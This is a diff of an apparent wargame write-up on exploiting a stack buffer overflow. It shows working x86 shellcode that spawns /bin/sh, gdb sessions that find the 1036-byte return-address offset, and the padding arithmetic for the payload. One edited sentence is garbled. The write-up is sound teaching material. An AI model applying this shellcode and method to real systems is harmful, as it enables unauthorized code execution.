@@ -21,23 +21,26 @@ We can overwrite the memory area beyond `buf` using a long command line argument
 
 If you recall from the previous challenge,
 the return address is stored on the stack after local variables.
-The return address is the address where execution will jump to after executing the current function.
 By writing past the end of `buf`,
 we can overwrite the return address,
-and thus make the program jump to where we want.
+so that when the function exits,
+the execution will jump to where we want,
+instead of the real next instruction.
 
-In the previous challenge we made the program jump to the insecure function `run`.
-In this program however there is no such easy target to jump to.
+In the previous challenge we could jump to the insecure function `run`.
+In this program however,
+we don't have such easy target.
 On the other hand,
-we can bring insecure code inside,
-by injecting it into `buf` through the input string.
+we can bring insecure code inside through the input string.
 
-We could inject what is commonly known as *shellcode*:
+We could inject what is commonly called a *shellcode*:
 a small piece of binary code that executes `/bin/sh`.
 
-Implementing the shellcode itself is beyond the scope of this article.
-It is thoroughly explained in the Smash The Stack article[5], see the resources.
-Essentially it is a modified version of this simple C program:
+Implementing such shellcode is beyond the scope of this article.
+If you are interested,
+it is thoroughly explained in the Smash The Stack article[5],
+see the resources.
+Essentially it is a modified version of a simple C program like this:
 ```
 #include <stdio.h>
 
@@ -52,8 +55,8 @@ void main() {
 Writing shellcode is not easy.
 After compiling such program,
 there is more work to do,
-for example you may have to rewrite some of the assembly instructions in a way to eliminate NULL bytes,
-as `strcpy` won't copy anything after it sees the first `NULL`.
+for example you may have to rewrite some of the assembly instructions to eliminate any NULL bytes,
+as `strcpy` won't copy anything beyond the first `NULL`.
 
 For our purposes,
 we can take the finished shellcode from the Smash The Stack article[5],
@@ -62,13 +65,13 @@ and for convenience, let's save it in a shell variable:
 EGG=$(printf '\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh')
 ```
 Next,
-we need to find the location of the return address.
+we need to find the exact location of the return address.
 The content of the stack will look something like this when we are inside `fun`:
 ```
 0x0000      content of the local variable buf (1024 bytes)
 0x0400+?    the return address
 ```
-That is, the return address is somewhere soon after the end of the buffer.
+That is, the return address is somewhere soon after the end of `buf`.
 We can find the right position using `gdb`.
 When we overwrite the return address with something invalid,
 `gdb` will print the address it could not jump to.
@@ -85,7 +88,7 @@ Program received signal SIGSEGV, Segmentation fault.
 0x41414141 in ?? ()
 ```
 We have successfully overwritten the return address with "A"s.
-Let's try a shorter string,
+Let's try another string,
 something that will help us pinpoint the correct position:
 ```
 (gdb) run $(python -c 'print "A" * 1024 + "abcdefghijklmnopqrstuvwxyz"')
@@ -94,52 +97,55 @@ Starting program: /levels/levels04/level04 $(python -c 'print "A" * 1024 + "abcd
 Program received signal SIGSEGV, Segmentation fault.
 0x706f6e6d in ?? ()
 ```
-That looks like somewhere in the middle of our `abc...` sequence.
-We can find the exact position by the ASCII codes of these letters:
+That looks within our `abc...` sequence.
+Let's check the ASCII codes to find the exact position:
 ```
-$ echo abcdefghijklmnopqrstuvwxyz | hexdump -C
+level03@box:/levels/level04$ echo abcdefghijklmnopqrstuvwxyz | hexdump -C
 00000000  61 62 63 64 65 66 67 68  69 6a 6b 6c 6d 6e 6f 70  |abcdefghijklmnop|
 00000010  71 72 73 74 75 76 77 78  79 7a 0a                 |qrstuvwxyz.|
 0000001b
 ```
-As `m=6d n=6e o=6f p=70`,
+Since `m=6d n=6e o=6f p=70`,
 the return address is in the place of the letters `mnop`.
-Since there are 12 letters before "m",
-we can calculate the target length that we need an input string of length 1024 + 12 + 4,
-where the last 4 bytes will be the address we want to jump to.
+As there are 12 letters before "m",
+we can calculate the target length until the return address is 1024 + 12 = 1036.
 Let's verify this final number with one last test in `gdb`:
 ```
-(gdb) run $(python -c 'print "A" * 1036 + "mmmm"')
-Starting program: /levels/levels04/level04 $(python -c 'print "A" * 1036 + "mmmm"')
+(gdb) run $(python -c 'print "A" * 1036 + "BBBB"')
+Starting program: /levels/levels04/level04 $(python -c 'print "A" * 1036 + "BBBB"')
 
 Program received signal SIGSEGV, Segmentation fault.
-0x6d6d6d6d in ?? ()
+0x42424242 in ?? ()
 ```
-Wonderful, what next?
-Our string should start with the shellcode,
-followed by some padding until 1036 bytes,
-and finally the address to jump to.
-Let's check the size of our shellcode:
+Perfect.
+If we put the shellcode at the beginning of the buffer,
+then our input string will be in this form:
 ```
-$ printf $EGG | wc -c
+SSSSSSSS PPPPPPPPPPPPPPPPPPPPPP AAAA
+```
+Where `S`s indicate the shellcode,
+`P`s the padding, and `A`s the jump address.
+We calculated the length of `S + P` is 1036,
+to know the length of `P` alone we must find the length of `S`:
+```
+level03@box:/levels/level04$ printf $EGG | wc -c
 45
 ```
-Thus, we will need 1036 - 45 = 991 padding characters.
-But what about the address?
+Thus, the length of the padding should be 1036 - 45 = 991 characters.
+
+The only thing missing is the jump address.
 We want to jump to the address of `buf`,
-but how can we know that?
-Unfortunately, we cannot.
+but how can we cannot know that.
 In the past,
 the stack used to be at the same address in all programs,
-which was easy to exploit,
-as you could have a good idea where to jump.
+which was easy to exploit.
 As of today,
 thanks to address space layout randomization (ASLR) used in modern operating systems,
 the start address of the stack is randomized,
 making it extremely difficult to guess the right location.
 
-Luckily,
-there are other interesting details that we can use:
+Luckily for us,
+some interesting details work in our favor:
 
 - On 32-bit x86 processors,
   a function that returns a pointer value places its result in register `%eax`.
